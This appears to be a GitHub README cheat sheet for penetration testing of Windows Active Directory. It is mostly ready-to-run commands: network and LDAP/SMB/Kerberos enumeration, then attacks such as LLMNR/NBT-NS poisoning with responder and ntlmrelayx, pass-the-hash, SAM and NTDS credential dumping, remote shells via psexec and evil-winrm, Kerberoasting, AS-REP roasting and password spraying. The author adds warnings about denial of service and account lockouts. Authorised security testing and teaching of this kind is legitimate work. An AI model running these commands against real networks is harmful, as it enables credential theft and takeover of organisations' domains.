![active-directory-monitoring](https://user-images.githubusercontent.com/84678370/127057641-382b4592-0b78-4883-b5e0-edae43e22556.png)


* ### Author: __Hiou__ 

* ### Linkedin: __https://www.linkedin.com/in/xl22glckz__  
## Summary
- [__Main__](#Main-Enum)
- [__RID__](#RID)
- [__LDAP__](#LDAP)
- [__SMB__](#SMB)
- [__rpcclient__](#rpcclient)
- [__crackmapexec smb__](#crackmapexec-SMB)
- [__crackmapexec mssql__](#crackmapexec-MSSQL)
- [__Kerberos Enum__](#Kerberos-Enum)
- [__Metasploit Enum__](#Metasploit-Enum)
- [__Metasploit Post__](#Metasploit-Post)
- [__Attack__](#Attack)
- [__LLMNR NBT NS__](#LLMNR)
- [__crackmapexec Attack__](#crackmapexec-Attack)
- [__pth-winexe Pass the Hash__](#pth-winexe-Pass-the-Hash)
- [__psexec__](#psexec)
- [__Evil winrm__](#evil-winrm)
- [__Kerberoasting__](#Kerberoasting)
- [__AS-REP Roasting__](#AS-REP-Roasting)
- [__Spraying The Forest__](#Spraying-The-Forest)
- [__Spray__](#Spray)

# Main Enum
````
crackmapexec 10.10.10.0/24

nmap -sn 10.10.10.0/24 > ips.txt

nmap -sn -f --min-rate 2000 -10.10.10.0/24 -oN file

nmap -g port -sn -f --min-rate 1000 10.10.10.0/24 -oN file

fping -g -a 192.168.1.0/24 2>/dev/null > ips.txt

nmap -f -sS -p- --open --min-rate 2000 -iL ips.txt -Pn -v -n -oG file

nmap -g port -f -sS -p- --open --min-rate 1000 -iL ips.txt -Pn -v -n -oG allPorts

nmap -sS -sU -p161 --min-rate 2000 -iL ips.txt -Pn -v -n -oN file

nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='domain.com'"
````
> ### _RID_
````
impacket-lookupsid username:password@pepe.local

cme smb 10.10.10.0/24 -u username -p 'password' --rid-brute

cme smb 10.10.10.x -u username -p 'password' --rid-brute --obfs

cme smb 10.10.10.x -u users.txt -p passwords.txt --rid-brute

cme smb 10.10.10.0/24 -u users.txt -p passwords.txt --rid-brute --obfs

ridenum <ip> <start_rid> <end_rid> <optional_password_file> <optional_username_filename>
````
> ### _LDAP_
````
nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP> -oN file

ldapdomaindump -r 10.10.10.x -u pepe.local\\username -p 'password' --authtype SIMPLE --no-json --no-grep

ldapsearch -x -h 10.10.10.x -D '' -w '' -b "DC=pepe.LOCAL"

ldapsearch -x -h 10.10.10.x -D 'pepe.LOCAL\username' -w 'password'

ldapsearch -x -h 10.10.10.x -D 'pepe.local\username' -w 'password' -b "DC=pepe,DC=local"

ldapsearch -x -h 10.10.10.x -D 'pepe.local\username' -w 'password' -b "CN=Users,DC=pepe,DC=local"
````
> ### _SMB_
````
smbmap -H 10.10.10.x -u invaliduser

smbmap -H 10.10.10.x -d "DOMAIN.LOCAL" -u "USERNAME" -p "Password" -d DOMAIN

smbclient -I 10.10.10.x -L ACTIVE -N -U ""

smbclient //10.10.10.x/share -N -c ls

smbclient -I 10.10.10.x -L ACTIVE -U username

enum4linux -a pepe.local

enum4linux -U -v pepe.local

enum4linux -a -u " " -p " " pepe.local

enum4linux -r pepe.local

enum4linux -r -u "username" -p "password" pepe.local

enum4linux -r -u "username" -p "password" pepe.local 2>/dev/null
````
> ### _rpcclient_
````
rpcclient -U "" 10.10.10.x -c "query" -N

rpcclient -U "username" 10.10.10.x -c "query"

./rpcenum -e 'query' -i 10.10.10.x > file # Example: All
````



> ### _crackmapexec SMB_
````
cme smb 10.10.10.x -u '' -p ''

cme smb 10.10.10.x -u '' -p '' --flag

cme smb 10.10.10.x -u username -p password --flag  #Example: --users --obfs 

cme smb 10.10.10.x 

cme smb target/s -u /path/users.txt -p /path/passwords.txt

cme smb 10.10.10.0/24 -u 'username' -p 'password'  
````

> ### _crackmapexec MSSQL_
````
cme mssql target/s -u /path/users.txt -p /path/passwords.txt

cme mssql 10.10.10.x -u username -p 'password' #--local-auth -q 'SELECT <query> FROM <query>;'  #Check comment
````

> ### _bloodhound_
````
bloodhound-python -c all -d pepe.local -u 'username' -p 'password' -ns 10.10.10.x

python3 bloodhound.py -c all -d pepe.local -u 'username' -p 'password' -ns 10.10.10.x
````
> ### _Kerberos Enum_
````
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='PEPE.LOCAL'" -Pn ip -v -n -oN users-nmap-recon

nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='PEPE.LOCAL',userdb=/path/usernames.txt ip
````
> ### _Metasploit Enum_ 
- - https://www.hackingarticles.in/penetration-testing-windows-server-active-directory-using-metasploit-part-1/
- - https://www.hackingarticles.in/penetration-testing-active-directory-using-metasploit-part-2/
- - https://medium.com/@Shorty420/enumerating-ad-98e0821c4c78
----
* systemctl start postgresql
* msfdb init
* db_status
````
use auxiliary/gather/kerberos_enumusers

use auxiliary/scanner/smb/smb_login

use auxiliary/scanner/smb/smb_lookupsid
````

> ### _Metasploit Post_
````
use post/windows/gather/enum_ad_computers

use post/windows/gather/enum_shares

use post/windows/gather/enum_ad_groups

use post/windows/manage/add_user_domain

use post/windows/manage/delete_user

use post/windows/gather/enum_logged_on_users

use post/windows/gather/credentials/gpp

use post/windows/manage/delete_user

use post/windows/gather/enum_services

use post/windows/gather/enum_termserv
````
# Attack

> ### __LLMNR__
 
> __Here you will see a summary of how network poisoning works and how to launch the attack. I do this so that you do not launch it without knowing what it is doing, since network poisoning can cause damage such as DDos, production stoppage, etc. Remember that your job is also to solve problems and search for information on your own. It is useless to launch an attack if you do not know how it works, so I recommend that you inform yourself well of all the attacks and tools shown here so that you understand at a low level what you are doing, you can have control and do not cause damage.__

> __Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.__ 

- ((MITM)) Adversaries can spoof an authoritative source for name resolution in a victim network by responding to LLMNR (UDP 5355) / NBT-NS (UDP 137) traffic as if they knew the identity of the requested host, effectively poisoning the service so that victims communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will be sent to the adversary controlled system.

>> __https://attack.mitre.org/techniques/T1557/001/__

- __Poisoning__

- - __Don't poisoning all network__
- - __responder.conf__
- - __responder__
- - __ntlmrelayx__

>> Don't poisoning all network

- __Modify the responder settings to your liking and when using ntlmrelayx, define targets. Poisoning the entire network could cause a denial of service__


>> responder.conf / Default
````
Servers to start
SQL = On
SMB = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = On
DNS = On
LDAP = On
````
>> responder usage
````
responder -h #Help

responder -I interface -A

responder -I interface -wrf

responder -I interface -rdw

responder -I interface --lm #check help
````

>> responder __NTLM__ / __responder.conf__ / __ntlmrelayx__
````
Servers to start
SQL = On
SMB = Off
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off
HTTPS = On
DNS = On
LDAP = On
````
````
impacket-ntlmrelayx -tf targets.txt -smb2support

responder -I interface -rdw
````
--- 
> ### _crackmapexec_ __Attack__
````
cme smb 10.10.10.x -u 'username' -H 'NTLM hash'

cme smb 10.10.10.x -u 'username' -p 'password' -x command 

cme smb 10.10.10.x -u 'username' -H 'NTLM hash' --sam

cme smb 10.10.10.x -u 'username' -p 'password' --sam

cme smb 10.10.10.x -u 'username' -p 'password' -M rdp -o ACTION=enable

cme smb 10.10.10.x -u 'username' -H 'NTLM hash' -M -rdp -o ACTION=enable

cme smb 10.10.10.x -u username -p 'password' --ntds

cme smb 10.10.10.x -u username -p 'password' --ntds vss
````
> ### _pth-winexe_ __Pass the Hash__
````
pth-winexe -U PEPE.LOCAL/username%HASH_LM:HASH_NTLM //10.10.10.x cmd.exe
````
> ### _psexec_
````
impacket-psexec pepe.local/username:password@10.10.10.x cmd.exe

impacket-psexec 'username:password@10.10.10.x' cmd.exe

python3 psexec.py pepe.local/username:password@10.10.10.x cmd.exe
````
> ### _evil-winrm_
````
evil-winrm -i 10.10.10.x -u username -p 'password'

evil-winrm -i 10.10.10.x -u username -H 'hash NTLM' #-p port
````
> ### _Kerberoasting_
````
impacket-GetUserSPNs -rquest -dc-ip 10.10.10.x blackfield.local/username

./kerbrute userenum --dc ip -d PEPE.local users.txt 
````
> ### _AS-REP Roasting_
````
impacket-GetNPUsers -format <format> PEPE.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.x -outputfile hashes.txt #format Example: john

impacket-GetADUsers -all -dc-ip 10.10.10.x PEPE.LOCAL/username
````
> ## _Spraying The Forest_
- __Warning Password Spraying__
* __https://docs.microsoft.com/en-us/security/compass/incident-response-playbook-password-spray__
> __When you decide to do a Spraying Attack, you should keep in mind that the policies lock accounts when you reach a certain number of brute force attempts.__
----
----
> ### _Spray_
* __https://github.com/Greenwolf/Spray__

````
/spray.sh -smb ip users-file creds-file <attempts> <minutes> pepe.local

/spray.sh -smb 10.10.10.x users creds 3 20 pepe.local
````
